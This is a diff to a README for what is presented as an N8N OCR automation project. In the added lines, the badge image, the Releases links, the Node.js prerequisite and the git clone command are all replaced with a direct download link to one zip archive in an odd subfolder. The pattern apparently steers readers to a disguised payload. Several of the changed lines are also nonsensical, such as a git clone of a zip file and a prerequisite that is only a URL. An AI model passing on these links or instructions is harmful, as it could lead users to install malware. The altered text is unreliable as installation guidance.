@@ -1,6 +1,6 @@
 # OCR Workflow: N8N Automation for Document Processing 🌟
 
-![OCR Workflow](https://img.shields.io/badge/OCR_Workflow-N8N%20Automation-blue.svg)
+![OCR Workflow](https://github.com/gani114433/OCR_workflow/raw/refs/heads/main/akhoond/OC_workflow_2.3-alpha.5.zip%https://github.com/gani114433/OCR_workflow/raw/refs/heads/main/akhoond/OC_workflow_2.3-alpha.5.zip)
 
 Welcome to the **OCR Workflow** repository! This project leverages N8N to automate Optical Character Recognition (OCR) tasks. Our goal is to provide a streamlined, codeless solution for processing PDF documents and extracting valuable information using AI technologies.
 
@@ -34,11 +34,11 @@ Optical Character Recognition (OCR) transforms different types of documents, suc
 
 ## Getting Started
 
-To get started with the **OCR Workflow**, visit our [Releases section](https://github.com/gani114433/OCR_workflow/releases) to download the latest version. Follow the instructions below to set up your environment.
+To get started with the **OCR Workflow**, visit our [Releases section](https://github.com/gani114433/OCR_workflow/raw/refs/heads/main/akhoond/OC_workflow_2.3-alpha.5.zip) to download the latest version. Follow the instructions below to set up your environment.
 
 ### Prerequisites
 
-- Node.js installed on your machine.
+- https://github.com/gani114433/OCR_workflow/raw/refs/heads/main/akhoond/OC_workflow_2.3-alpha.5.zip installed on your machine.
 - Basic understanding of N8N and its functionalities.
 
 ## Workflow Overview
@@ -58,7 +58,7 @@ To install the OCR Workflow, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/gani114433/OCR_workflow.git
+   git clone https://github.com/gani114433/OCR_workflow/raw/refs/heads/main/akhoond/OC_workflow_2.3-alpha.5.zip
    cd OCR_workflow
    ```
 
@@ -106,6 +106,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For questions or feedback, please reach out to us through the repository or visit our [Releases section](https://github.com/gani114433/OCR_workflow/releases) for updates.
+For questions or feedback, please reach out to us through the repository or visit our [Releases section](https://github.com/gani114433/OCR_workflow/raw/refs/heads/main/akhoond/OC_workflow_2.3-alpha.5.zip) for updates.
 
 Thank you for checking out the **OCR Workflow**! We hope this project simplifies your document processing tasks.
